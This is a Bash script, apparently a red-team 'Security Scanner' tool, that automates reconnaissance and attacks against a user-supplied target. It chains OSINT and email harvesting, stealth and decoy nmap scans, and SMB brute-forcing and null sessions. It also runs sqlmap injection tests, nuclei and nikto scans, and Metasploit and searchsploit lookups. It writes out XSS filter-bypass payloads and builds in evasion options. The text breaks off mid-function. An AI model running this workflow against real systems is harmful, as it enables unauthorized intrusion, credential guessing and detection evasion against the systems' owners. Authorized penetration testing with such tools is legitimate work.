#!/bin/bash
set -euo pipefail

# Couleurs 
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
BOLD='\033[1m'
DIM='\033[2m'
UNDERLINE='\033[4m'
BLINK='\033[5m'
REVERSE='\033[7m'
BRIGHT_RED='\033[1;31m'
BRIGHT_GREEN='\033[1;32m'
BRIGHT_YELLOW='\033[1;33m'
BRIGHT_BLUE='\033[1;34m'
BRIGHT_MAGENTA='\033[1;35m'
BRIGHT_CYAN='\033[1;36m'
BRIGHT_WHITE='\033[1;37m'
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'
BG_MAGENTA='\033[45m'
BG_CYAN='\033[46m'
BG_WHITE='\033[47m'
NC='\033[0m'

VERSION="2.2.1"

# Variables globales
SCAN_INTERRUPTED=false
CURRENT_SCAN=""

display_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
                                                               
███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${BOLD}${BG_BLUE}${WHITE}                ADVANCED RED TEAM SECURITY ASSESSMENT TOOL                ${NC}"
    echo
    echo -e "${BRIGHT_CYAN}Version:${NC} ${BRIGHT_YELLOW}${VERSION}${NC} | ${BRIGHT_CYAN}Author:${NC} ${BRIGHT_GREEN}mpgamer75${NC}"
    echo -e "${DIM}${GRAY}Ethical Hacking & Penetration Testing${NC}"
    echo
}

show_help() {
    cat << "EOF"

USAGE:
    security [OPTIONS]

OPTIONS:
    -h, --help      Show this help message
    -v, --version   Show version information
    -q, --quick     Quick scan mode (faster, less comprehensive)
    -s, --stealth   Stealth mode (slower, evasive techniques)

SCAN TYPES:
    1. OSINT & Information Gathering
       - WHOIS lookups and domain information
       - DNS enumeration (A, MX, NS, TXT records)
       - Email harvesting with multiple sources
       - Subdomain enumeration and certificate transparency
       - Social media and breach data reconnaissance

    2. Network Reconnaissance & Enumeration
       - Adaptive port scanning with progress indicators
       - Service version detection and OS fingerprinting
       - Banner grabbing and service enumeration
       - SMB/NetBIOS enumeration
       - SNMP community string testing

    3. Web Application Security Testing
       - Technology stack identification
       - Directory and file enumeration
       - Vulnerability scanning with Nuclei templates
       - SQL injection and XSS testing
       - SSL/TLS configuration analysis

    4. Advanced Red Team Assessment
       - Complete reconnaissance workflow
       - Stealth scanning techniques
       - Automated vulnerability correlation
       - Attack surface mapping
       - Post-exploitation preparation data

TOOLS INTEGRATED:
    OSINT: whois, theharvester, subfinder, amass, crt.sh
    Network: nmap, masscan, rustscan, enum4linux, smbclient
    Web: whatweb, nikto, gobuster, nuclei, sqlmap, wafw00f
    Exploits: searchsploit, msfconsole integration prep, vulscan

FEATURES:
    ✓ Real-time progress indicators
    ✓ Graceful interrupt handling (Ctrl+C)
    ✓ Adaptive timeout management
    ✓ Stealth and evasion techniques
    ✓ Comprehensive reporting
    ✓ Red team workflow optimization
    ✓ Professional vulnerability correlation

EXAMPLES:
    security                    # Interactive mode
    security --quick           # Fast reconnaissance
    security --stealth         # Evasive scanning

EOF
}

# Enhanced interruption handling
handle_interrupt() {
    SCAN_INTERRUPTED=true
    echo -e "\n${YELLOW}[!]${NC} Interruption detected..."
    
    if [ -n "$CURRENT_SCAN" ]; then
        echo -e "${CYAN}[INFO]${NC} Stopping current scan: $CURRENT_SCAN"
        # Kill background processes
        jobs -p | xargs -r kill 2>/dev/null || true
    fi
    
    echo -e "${YELLOW}[INFO]${NC} Generating partial report..."
    generate_clean_report
    echo -e "\n${CYAN}[INFO]${NC} Partial results saved in: ${WHITE}$OUTDIR${NC}"
    echo -e "${YELLOW}Scan interrupted by user${NC}"
    exit 130
}

# Variables globales
OUTDIR=""
TARGET=""
URL=""
DOMAIN=""
QUICK_MODE=false
STEALTH_MODE=false

prepare_output() {
    OUTDIR="redteam_assessment_$(date +'%Y%m%d_%H%M%S')"
    mkdir -p "$OUTDIR"/{osint,network,web,vulnerabilities,reports,exploitation}
    echo -e "${GREEN}[INFO]${NC} Results directory: ${WHITE}$OUTDIR${NC}"
}

# Fonction améliorée d'exécution avec indicateur de progression
execute_with_progress() {
    local name="$1"
    local command="$2"
    local timeout_duration="${3:-300}"
    local output_file="$4"
    local show_progress="${5:-true}"
    
    CURRENT_SCAN="$name"
    echo -e "${CYAN}[START]${NC} $name"
    
    # Fonction de progression en arrière-plan
    if [ "$show_progress" = true ]; then
        (
            local elapsed=0
            while [ $elapsed -lt $timeout_duration ] && kill -0 $$ 2>/dev/null; do
                printf "\r${YELLOW}[%02d:%02d]${NC} $name in progress..." $((elapsed/60)) $((elapsed%60))
                sleep 5
                elapsed=$((elapsed + 5))
            done
        ) &
        local progress_pid=$!
    fi
    
    
    set +e
    timeout "$timeout_duration" bash -c "$command" > "$output_file" 2>&1 &
    local cmd_pid=$!
    
    
    while kill -0 $cmd_pid 2>/dev/null && [ "$SCAN_INTERRUPTED" = false ]; do
        sleep 1
    done
    
    
    if [ "$show_progress" = true ]; then
        kill $progress_pid 2>/dev/null || true
        wait $progress_pid 2>/dev/null || true
        printf "\r${GREEN}[DONE]${NC} %-50s\n" "$name"
    fi
    
    local exit_code=0
    if kill -0 $cmd_pid 2>/dev/null; then
        kill $cmd_pid 2>/dev/null
        wait $cmd_pid 2>/dev/null || true
        if [ "$SCAN_INTERRUPTED" = true ]; then
            echo "SCAN INTERRUPTED BY USER" >> "$output_file"
            exit_code=130
        else
            echo "SCAN TIMEOUT AFTER ${timeout_duration} SECONDS" >> "$output_file"
            exit_code=124
        fi
    else
        wait $cmd_pid
        exit_code=$?
    fi
    
    set -e
    CURRENT_SCAN=""
    
    case $exit_code in
        0) return 0 ;;
        130) return 130 ;;
        *) 
            echo -e "${YELLOW}[WARNING]${NC} $name completed with errors (code: $exit_code)"
            return 0 
            ;;
    esac
}

show_scan_menu() {
    echo -e "\n${BRIGHT_CYAN}ASSESSMENT TYPE SELECTION${NC}"
    echo
    echo -e "${BRIGHT_CYAN}1)${NC} ${BRIGHT_GREEN}OSINT & Information Gathering${NC}"
    echo -e "   ${DIM}${GRAY}• Passive reconnaissance and public data collection${NC}"
    echo -e "   ${DIM}${GRAY}• Subdomain enumeration and email harvesting${NC}"
    echo -e "   ${DIM}${GRAY}• Certificate analysis and DNS enumeration${NC}"
    echo
    echo -e "${BRIGHT_CYAN}2)${NC} ${BRIGHT_YELLOW}Network Reconnaissance & Enumeration${NC}"
    echo -e "   ${DIM}${GRAY}• Port scanning and service detection${NC}"
    echo -e "   ${DIM}${GRAY}• SMB, SNMP and protocol enumeration${NC}"
    echo -e "   ${DIM}${GRAY}• Network vulnerability detection${NC}"
    echo
    echo -e "${BRIGHT_CYAN}3)${NC} ${BRIGHT_MAGENTA}Web Application Security Testing${NC}"
    echo -e "   ${DIM}${GRAY}• Directory and file enumeration${NC}"
    echo -e "   ${DIM}${GRAY}• SQL injection and XSS testing${NC}"
    echo -e "   ${DIM}${GRAY}• SSL/TLS analysis and WAF detection${NC}"
    echo
    echo -e "${BRIGHT_CYAN}4)${NC} ${BRIGHT_RED}Complete Red Team Assessment${NC}"
    echo -e "   ${DIM}${GRAY}• Combination of all modules above${NC}"
    echo -e "   ${DIM}${GRAY}• Automated attack script generation${NC}"
    echo -e "   ${DIM}${GRAY}• Exploitation preparation and persistence${NC}"
    echo
    
    # Active modes display
    if [ "$QUICK_MODE" = true ] || [ "$STEALTH_MODE" = true ]; then
        echo -e "${BRIGHT_YELLOW}ACTIVE MODES${NC}"
        if [ "$QUICK_MODE" = true ]; then
            echo -e "${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Quick Mode:${NC} Speed-optimized scans"
        fi
        if [ "$STEALTH_MODE" = true ]; then
            echo -e "${BRIGHT_BLUE}*${NC} ${BRIGHT_YELLOW}Stealth Mode:${NC} Evasion techniques and discrete scans"
        fi
        echo
    fi
}

run_osint_scans() {
    local target="$1"
    local domain="$2"
    
    echo -e "\n${RED}[OSINT]${NC} Starting information gathering..."
    
    if [ -n "$domain" ]; then
        execute_with_progress "WHOIS Lookup" "whois '$domain'" 60 "$OUTDIR/osint/whois.txt"
        
        # Enhanced DNS enumeration
        execute_with_progress "DNS Enumeration" "
            echo '=== A Records ===' 
            dig +short '$domain' A
            echo -e '\n=== MX Records ==='
            dig +short '$domain' MX
            echo -e '\n=== NS Records ==='
            dig +short '$domain' NS
            echo -e '\n=== TXT Records ==='
            dig +short '$domain' TXT
            echo -e '\n=== AAAA Records ==='
            dig +short '$domain' AAAA
            echo -e '\n=== CNAME Records ==='
            dig +short '$domain' CNAME
        " 60 "$OUTDIR/osint/dns_enum.txt"
        
        # Advanced and comprehensive subdomain enumeration
        if command -v subfinder &> /dev/null; then
            execute_with_progress "Subfinder Discovery" "subfinder -d '$domain' -all -recursive -silent -o '$OUTDIR/osint/subdomains_subfinder.txt'" 300 "$OUTDIR/osint/subdomains_subfinder.txt"
        fi
        
        if command -v amass &> /dev/null; then
            local amass_timeout=600
            [ "$QUICK_MODE" = true ] && amass_timeout=300
            execute_with_progress "Amass Enumeration" "amass enum -passive -d '$domain' -silent -o '$OUTDIR/osint/subdomains_amass.txt'" $amass_timeout "$OUTDIR/osint/subdomains_amass.txt"
        fi
        
        # Assetfinder for subdomain discovery
        if command -v assetfinder &> /dev/null; then
            execute_with_progress "Assetfinder Discovery" "assetfinder --subs-only '$domain'" 180 "$OUTDIR/osint/subdomains_assetfinder.txt"
        fi
        
        # Findomain for rapid discovery
        if command -v findomain &> /dev/null; then
            execute_with_progress "Findomain Discovery" "findomain -t '$domain' -q" 120 "$OUTDIR/osint/subdomains_findomain.txt"
        fi
        
        # Subdomain consolidation
        execute_with_progress "Subdomain Consolidation" "
            echo '=== Consolidated Subdomains ==='
            cat '$OUTDIR/osint/subdomains_'*.txt 2>/dev/null | sort -u | grep -v '^$' > '$OUTDIR/osint/all_subdomains.txt' || echo 'No subdomains found'
            echo 'Total unique subdomains found: \$(cat '$OUTDIR/osint/all_subdomains.txt' | wc -l)'
            echo -e '\n=== Top 10 Subdomains ==='
            head -10 '$OUTDIR/osint/all_subdomains.txt' 2>/dev/null || echo 'No subdomains to display'
        " 60 "$OUTDIR/osint/subdomain_summary.txt"
        
        # Certificate transparency (with jq verification)
        if command -v jq &> /dev/null; then
            execute_with_progress "Certificate Transparency" "
                curl -s 'https://crt.sh/?q=%.$domain&output=json' | jq -r '.[].name_value' 2>/dev/null | sed 's/\\*\\.//g' | sort -u || echo 'No certificate data found'
            " 60 "$OUTDIR/osint/crt_sh.txt"
        else
            execute_with_progress "Certificate Transparency" "
                curl -s 'https://crt.sh/?q=%.$domain&output=json' | grep -oP '\"name_value\":\"\\K[^\"]+' | sed 's/\\*\\.//g' | sort -u || echo 'No certificate data found'
            " 60 "$OUTDIR/osint/crt_sh.txt"
        fi
        
        # Email harvesting - theHarvester correction
        if command -v theHarvester &> /dev/null; then
            execute_with_progress "Email Harvesting" "theHarvester -d '$domain' -l 200 -b google,bing,yahoo,duckduckgo,hunter,baidu,linkedin" 300 "$OUTDIR/osint/emails.txt"
        elif command -v theharvester &> /dev/null; then
            # Fallback for legacy version
            execute_with_progress "Email Harvesting (Legacy)" "theharvester -d '$domain' -l 200 -b google,bing,yahoo,duckduckgo" 300 "$OUTDIR/osint/emails.txt"
        fi
        
        # Advanced Google dorking automation
        execute_with_progress "Google Dorking" "
            echo '=== Document Discovery ==='
            echo \"site:$domain filetype:pdf\"
            echo \"site:$domain filetype:doc\"
            echo \"site:$domain filetype:docx\"
            echo \"site:$domain filetype:xls\"
            echo \"site:$domain filetype:xlsx\"
            echo \"site:$domain filetype:ppt\"
            echo \"site:$domain filetype:pptx\"
            echo \"site:$domain filetype:txt\"
            echo -e '\n=== Admin Panels & Login Pages ==='
            echo \"site:$domain inurl:admin\"
            echo \"site:$domain inurl:administrator\"
            echo \"site:$domain inurl:login\"
            echo \"site:$domain inurl:signin\"
            echo \"site:$domain inurl:auth\"
            echo \"site:$domain inurl:dashboard\"
            echo \"site:$domain inurl:panel\"
            echo -e '\n=== Configuration & Sensitive Files ==='
            echo \"site:$domain inurl:config\"
            echo \"site:$domain inurl:backup\"
            echo \"site:$domain inurl:database\"
            echo \"site:$domain inurl:db\"
            echo \"site:$domain inurl:sql\"
            echo \"site:$domain filetype:sql\"
            echo \"site:$domain filetype:env\"
            echo \"site:$domain filetype:log\"
            echo -e '\n=== Directory Listings ==='
            echo \"site:$domain intitle:'index of'\"
            echo \"site:$domain intitle:'directory listing'\"
            echo -e '\n=== Error Pages & Debug Info ==='
            echo \"site:$domain intext:'error'\"
            echo \"site:$domain intext:'warning'\"
            echo \"site:$domain intext:'debug'\"
            echo \"site:$domain intext:'stack trace'\"
            echo -e '\n=== API & Development ==='
            echo \"site:$domain inurl:api\"
            echo \"site:$domain inurl:v1\"
            echo \"site:$domain inurl:v2\"
            echo \"site:$domain inurl:rest\"
            echo \"site:$domain inurl:graphql\"
            echo \"site:$domain inurl:swagger\"
        " 30 "$OUTDIR/osint/google_dorks.txt"
        
        # Shodan integration if available
        if command -v shodan &> /dev/null; then
            execute_with_progress "Shodan Search" "
                echo '=== Shodan Domain Search ==='
                shodan domain '$domain' 2>/dev/null || echo 'Shodan search failed - API key required'
                echo -e '\n=== Shodan Host Search ==='
                shodan search 'hostname:$domain' --limit 10 2>/dev/null || echo 'Shodan host search failed'
            " 120 "$OUTDIR/osint/shodan.txt"
        fi
        
        # Wayback Machine URLs
        execute_with_progress "Wayback Machine URLs" "
            echo '=== Wayback Machine Historical URLs ==='
            curl -s 'http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original&collapse=urlkey' | head -100 || echo 'Wayback Machine search failed'
        " 60 "$OUTDIR/osint/wayback_urls.txt"
        
        # Social media reconnaissance
        execute_with_progress "Social Media Recon" "
            echo '=== Social Media Profiles ==='
            echo 'LinkedIn: https://www.linkedin.com/company/$domain'
            echo 'Twitter: https://twitter.com/search?q=$domain'
            echo 'Facebook: https://www.facebook.com/search/top?q=$domain'
            echo 'Instagram: https://www.instagram.com/explore/tags/$domain'
            echo 'YouTube: https://www.youtube.com/results?search_query=$domain'
            echo 'GitHub: https://github.com/search?q=$domain'
            echo -e '\n=== Breach Data Sources ==='
            echo 'HaveIBeenPwned: Check emails found for breaches'
            echo 'DeHashed: Commercial breach data search'
            echo 'IntelligenceX: OSINT search engine'
        " 30 "$OUTDIR/osint/social_media.txt"
    fi
    
    if [ -n "$target" ]; then
        execute_with_progress "Reverse DNS" "dig +short -x '$target' || echo 'No PTR record'" 30 "$OUTDIR/osint/reverse_dns.txt"
        execute_with_progress "IP Geolocation" "curl -s 'http://ip-api.com/json/$target' || echo 'Geolocation failed'" 30 "$OUTDIR/osint/geolocation.txt"
    fi
    
    echo -e "${GREEN}[COMPLETED]${NC} OSINT collection completed"
}

run_network_scans() {
    local target="$1"
    
    echo -e "\n${RED}[NETWORK]${NC} Starting network reconnaissance..."
    
    # Enhanced host discovery with -Pn to avoid blocking
    execute_with_progress "Host Discovery" "nmap -sn -Pn -PE -PP -PS21,22,23,25,53,80,113,443,993,995 '$target'" 60 "$OUTDIR/network/host_discovery.txt"
    
    # Adaptive port scanning by mode - ALL with -Pn
    if [ "$QUICK_MODE" = true ]; then
        # Quick mode - top 1000 ports only
        execute_with_progress "Quick Port Scan" "nmap -Pn -T5 --top-ports 1000 --min-rate=5000 '$target'" 180 "$OUTDIR/network/nmap_quick.txt"
        
        # Rustscan if available (faster)
        if command -v rustscan &> /dev/null; then
            execute_with_progress "RustScan Ultra-Fast" "rustscan -a '$target' --top" 120 "$OUTDIR/network/rustscan.txt"
        fi
    elif [ "$STEALTH_MODE" = true ]; then
        # Stealth mode - slow and evasive scans
        execute_with_progress "Stealth SYN Scan" "nmap -Pn -sS -T2 -f --mtu 24 --scan-delay 5s --top-ports 1000 '$target'" 1800 "$OUTDIR/network/nmap_stealth.txt"
        execute_with_progress "Decoy Scan" "nmap -Pn -sS -T2 -D RND:10 --top-ports 500 '$target'" 1200 "$OUTDIR/network/nmap_decoy.txt"
    else
        # Optimized standard mode - WITH mandatory -Pn
        execute_with_progress "Standard Port Scan" "nmap -Pn -sS -T4 --top-ports 3000 --min-rate=1000 '$target'" 600 "$OUTDIR/network/nmap_standard.txt"
        
        # Service detection on open ports only - WITH -Pn (optimized)
        execute_with_progress "Service Detection" "nmap -Pn -sV -sC --version-intensity 3 --top-ports 1000 --max-retries 2 --host-timeout 10m '$target'" 1200 "$OUTDIR/network/nmap_services.txt"
    fi
    
    # Critical UDP scan only (optimized) - WITH -Pn
    execute_with_progress "UDP Critical Ports" "nmap -Pn -sU --top-ports 20 '$target'" 300 "$OUTDIR/network/nmap_udp_critical.txt"
    
    # Lightweight OS detection - WITH -Pn (optimized)
    execute_with_progress "OS Fingerprinting" "nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 5m '$target'" 300 "$OUTDIR/network/nmap_os.txt"
    
    # Targeted vulnerability scripts - OPTIMIZED VERSION 2024
    execute_with_progress "Vulnerability Scripts" "nmap -Pn --script 'vuln and not dos and not intrusive' --script-args vulns.showall --top-ports 1000 --max-retries 1 --host-timeout 10m '$target'" 900 "$OUTDIR/network/nmap_vulns.txt"
    
    # Specific critical vulnerability scripts
    execute_with_progress "Critical Vulnerability Scan" "nmap -Pn --script 'smb-vuln-*,ssl-*,http-vuln-*' --script-args unsafe=1 '$target'" 400 "$OUTDIR/network/nmap_critical_vulns.txt"
    
    # Modern vulners script if available (optimized)
    if nmap --script-help vulners 2>/dev/null | grep -q vulners; then
        execute_with_progress "Vulners Database Scan" "nmap -Pn -sV --script vulners --script-args mincvss=5.0 --top-ports 1000 --max-retries 1 --host-timeout 8m '$target'" 600 "$OUTDIR/network/nmap_vulners.txt"
    fi
    
    # Vulscan if available
    if [ -f "/usr/share/nmap/scripts/vulscan/vulscan.nse" ] || [ -f "/usr/local/share/nmap/scripts/vulscan/vulscan.nse" ]; then
        execute_with_progress "Vulscan Database" "nmap -Pn -sV --script vulscan/vulscan.nse '$target'" 400 "$OUTDIR/network/nmap_vulscan.txt"
    fi
    
    # Complete and optimized SMB enumeration - WITH -Pn
    execute_with_progress "SMB Enumeration" "
        echo '=== SMB Port Check ==='
        smb_check=\$(nmap -Pn -p 139,445 --open '$target' 2>/dev/null | grep -E '139/tcp|445/tcp' | grep -v filtered)
        if [ -n \"\$smb_check\" ]; then
            echo 'SMB ports detected, proceeding with enumeration...'
            echo -e '\n=== SMB Version Detection ==='
            nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb-os-discovery --host-timeout 3m '$target'
            echo -e '\n=== SMB Shares Enumeration ==='
            nmap -Pn -p 445 --script smb-enum-shares,smb-enum-domains,smb-enum-groups,smb-enum-users --host-timeout 3m '$target'
            echo -e '\n=== SMB Vulnerability Scan ==='
            nmap -Pn -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec --host-timeout 2m '$target'
            echo -e '\n=== SMB Brute Force Protection Check ==='
            nmap -Pn -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt,unpwdb.timelimit=30s --host-timeout 2m '$target' 2>/dev/null || echo 'SMB brute force check skipped'
        else
            echo 'SMB ports (139/445) are filtered or closed - skipping detailed SMB enumeration'
            nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb-os-discovery --host-timeout 3m '$target'
        fi
        if command -v enum4linux &> /dev/null; then
            echo -e '\n=== Enum4linux Results ==='
            timeout 120 enum4linux -a '$target' 2>/dev/null || echo 'enum4linux timeout or failed'
        fi
        if command -v smbclient &> /dev/null; then
            echo -e '\n=== SMB Client Null Session Test ==='
            timeout 30 smbclient -L '$target' -N 2>/dev/null || echo 'SMB null session failed'
        fi
    " 400 "$OUTDIR/network/smb_enum.txt"
    
    # SNMP enumeration - AVEC -Pn
    execute_with_progress "SNMP Enumeration" "nmap -Pn -sU -p 161 --script snmp-sysdescr,snmp-processes,snmp-netstat '$target'" 180 "$OUTDIR/network/snmp_enum.txt"
    
    echo -e "${GREEN}[COMPLETED]${NC} Network reconnaissance completed"
}

run_web_scans() {
    local url="$1"
    
    echo -e "\n${RED}[WEB]${NC} Starting web application testing..."
    
    # Check if web ports are accessible
    local domain_from_url=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')
    local web_check=$(nmap -Pn -p 80,443,8080,8443 --open "$domain_from_url" 2>/dev/null | grep -E '80/tcp|443/tcp|8080/tcp|8443/tcp' | grep open)
    
    if [ -z "$web_check" ]; then
        echo -e "${YELLOW}[WARNING]${NC} No web ports detected as open, but continuing with web scans..."
    else
        echo -e "${GREEN}[INFO]${NC} Web ports detected: $(echo "$web_check" | cut -d'/' -f1 | tr '\n' ' ')"
    fi
    
    # Enhanced technology detection
    if command -v whatweb &> /dev/null; then
        execute_with_progress "Technology Detection" "whatweb '$url' -a 3 -v" 120 "$OUTDIR/web/whatweb.txt"
    fi
    
    # WAF detection
    if command -v wafw00f &> /dev/null; then
        execute_with_progress "WAF Detection" "wafw00f '$url'" 60 "$OUTDIR/web/wafw00f.txt"
    fi
    
    # Enhanced SSL/TLS analysis
    execute_with_progress "SSL/TLS Analysis" "
        domain_from_url=\$(echo '$url' | sed 's|https\\?://||' | sed 's|/.*||')
        echo '=== SSL Certificate Info ==='
        echo | openssl s_client -connect \"\${domain_from_url}:443\" -servername \"\$domain_from_url\" 2>/dev/null | openssl x509 -text 2>/dev/null || echo 'SSL connection failed'
        echo -e '\n=== SSL Configuration ==='
        nmap -Pn --script ssl-enum-ciphers -p 443 \"\$domain_from_url\" 2>/dev/null || echo 'SSL scan failed'
        echo -e '\n=== SSL Vulnerabilities ==='
        nmap -Pn --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection \"\$domain_from_url\" 2>/dev/null || echo 'SSL vuln scan failed'
    " 180 "$OUTDIR/web/ssl_analysis.txt"
    
    # Optimized directory enumeration
    local wordlist_dir="/usr/share/wordlists/dirb"
    [ ! -d "$wordlist_dir" ] && wordlist_dir="$HOME/.local/share/wordlists/dirb"
    
    if command -v gobuster &> /dev/null && [ -f "$wordlist_dir/common.txt" ]; then
        if [ "$QUICK_MODE" = true ]; then
            execute_with_progress "Quick Directory Enum" "gobuster dir -u '$url' -w '$wordlist_dir/common.txt' -t 30 -x php,html,txt -q" 300 "$OUTDIR/web/gobuster_quick.txt"
        else
            execute_with_progress "Directory Enumeration" "gobuster dir -u '$url' -w '$wordlist_dir/common.txt' -t 50 -x php,html,txt,js,css,json -q" 600 "$OUTDIR/web/gobuster_common.txt"
            execute_with_progress "Extended Directory Enum" "gobuster dir -u '$url' -w '$wordlist_dir/big.txt' -t 30 -x php,html -q" 900 "$OUTDIR/web/gobuster_extended.txt"
        fi
    fi
    
    # Enhanced Nuclei vulnerability scanning
    if command -v nuclei &> /dev/null; then
        if [ "$QUICK_MODE" = true ]; then
            execute_with_progress "Quick Vulnerability Scan" "nuclei -u '$url' -severity critical,high -silent" 300 "$OUTDIR/web/nuclei_quick.txt"
        else
            execute_with_progress "Comprehensive Vuln Scan" "nuclei -u '$url' -severity critical,high,medium -silent" 900 "$OUTDIR/web/nuclei_comprehensive.txt"
        fi
    fi
    
    # Nikto scan
    if command -v nikto &> /dev/null; then
        local nikto_timeout=600
        [ "$QUICK_MODE" = true ] && nikto_timeout=300
        execute_with_progress "Nikto Web Scan" "nikto -h '$url' -C all -Format txt" $nikto_timeout "$OUTDIR/web/nikto.txt"
    fi
    
    # SQL injection testing
    if command -v sqlmap &> /dev/null; then
        mkdir -p "$OUTDIR/web/sqlmap"
        execute_with_progress "SQL Injection Testing" "sqlmap -u '$url' --batch --level=2 --risk=2 --output-dir='$OUTDIR/web/sqlmap' --threads=5" 600 "$OUTDIR/web/sqlmap/sqlmap.log"
    fi
    
    # XSS testing with various techniques
    execute_with_progress "XSS Detection" "
        echo '=== Basic XSS Payloads ==='
        echo '<script>alert(1)</script>'
        echo '\"><script>alert(1)</script>'
        echo 'javascript:alert(1)'
        echo '=== Advanced XSS Payloads ==='
        echo '<img src=x onerror=alert(1)>'
        echo '<svg onload=alert(1)>'
        echo \"';alert(1);//\"
        echo '=== Bypass Payloads ==='
        echo '<ScRiPt>alert(1)</ScRiPt>'
        echo 'javas\\u0063ript:alert(1)'
        echo '<iframe src=javascript:alert(1)>'
    " 30 "$OUTDIR/web/xss_payloads.txt"
    
    echo -e "${GREEN}[COMPLETED]${NC} Web application testing completed"
}

run_exploitation_prep() {
    local target="$1"
    
    echo -e "\n${RED}[EXPLOIT]${NC} Exploitation preparation..."
    
    # Enhanced Searchsploit integration
    if command -v searchsploit &> /dev/null; then
        execute_with_progress "Exploit Database Search" "
            # Search by detected services
            if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
                echo '=== Exploits by detected services ==='
                grep -oP '\\d+/tcp\\s+open\\s+\\K[^\\s]+' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | while read service; do
                    echo \"=== Exploits for \$service ===\"
                    searchsploit \"\$service\" 2>/dev/null | head -10 || echo \"No exploits found for \$service\"
                    echo
                done
            else
                echo \"Services file not found\"
            fi
            
            # Search by detected vulnerabilities
            if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
                echo -e '\n=== Exploits by detected CVEs ==='
                grep -oP 'CVE-[0-9]{4}-[0-9]+' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | head -5 | while read cve; do
                    echo \"=== Exploits for \$cve ===\"
                    searchsploit \"\$cve\" 2>/dev/null | head -5 || echo \"No exploits found for \$cve\"
                    echo
                done
            fi
        " 300 "$OUTDIR/exploitation/searchsploit.txt"
    fi
    
    # Enhanced MSF module suggestions
    execute_with_progress "Metasploit Module Prep" "
        echo '=== Suggested MSF Modules Based on Scan Results ==='
        echo '# Port scanning modules'
        echo 'use auxiliary/scanner/portscan/tcp'
        echo 'use auxiliary/scanner/portscan/syn'
        echo
        echo '# Service-specific modules'
        echo 'use auxiliary/scanner/smb/smb_version'
        echo 'use auxiliary/scanner/http/http_version'
        echo 'use auxiliary/scanner/ssh/ssh_version'
        echo 'use auxiliary/scanner/ftp/ftp_version'
        echo
        echo '# Vulnerability scanners'
        echo 'use auxiliary/scanner/smb/smb_ms17_010'
        echo 'use auxiliary/scanner/http/http_header'
        echo 'use auxiliary/scanner/ssl/openssl_heartbleed'
        echo
        echo '# Exploitation modules'
        echo 'search type:exploit platform:linux'
        echo 'search type:exploit platform:windows'
        echo 'search cve:2017 type:exploit'
        echo
        echo '# Post exploitation'
        echo 'use post/multi/recon/local_exploit_suggester'
        echo 'use post/multi/gather/env'
    " 30 "$OUTDIR/exploitation/msf_prep.txt"
    
    # Enhanced common attack vectors summary
    execute_with_progress "Attack Surface Analysis" "
        echo '=== ATTACK SURFACE ANALYSIS ==='
        echo 'Generated on: $(date)'
        echo
        echo '=== Open Ports and Services ==='
        if [ -f '$OUTDIR/network/nmap_standard.txt' ]; then
            grep 'open' '$OUTDIR/network/nmap_standard.txt' | head -15
        else
            echo 'No standard port scan results found'
        fi
        
        echo -e '\n=== Web Technologies and Frameworks ==='
        if [ -f '$OUTDIR/web/whatweb.txt' ]; then
            grep -i 'Title\\|Server\\|Framework\\|CMS' '$OUTDIR/web/whatweb.txt' | head -10
        else
            echo 'No web technology scan results found'
        fi
        
        echo -e '\n=== Detected Vulnerabilities ==='
        if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
            grep -i 'VULNERABLE\\|CVE\\|CRITICAL\\|HIGH' '$OUTDIR/network/nmap_vulns.txt' | head -10
        else
            echo 'No vulnerability scan results found'
        fi
        
        echo -e '\n=== POTENTIAL ATTACK VECTORS ==='
        echo '1. Network Entry Points:'
        echo '   - SSH Brute Force (if port 22 open)'
        echo '   - FTP Anonymous/Brute Force (if port 21 open)'
        echo '   - SMB/NetBIOS Attacks (if port 445 open)'
        echo '   - Web Application Attacks (if HTTP/HTTPS open)'
        echo '   - Database Direct Access (if DB ports open)'
        echo
        echo '2. Web Application Attacks:'
        echo '   - SQL Injection on forms/parameters'
        echo '   - XSS via input fields'
        echo '   - Directory Traversal'
        echo '   - File Upload Vulnerabilities'
        echo '   - Authentication Bypass'
        echo
        echo '3. Privilege Escalation:'
        echo '   - Kernel Exploits (based on OS detection)'
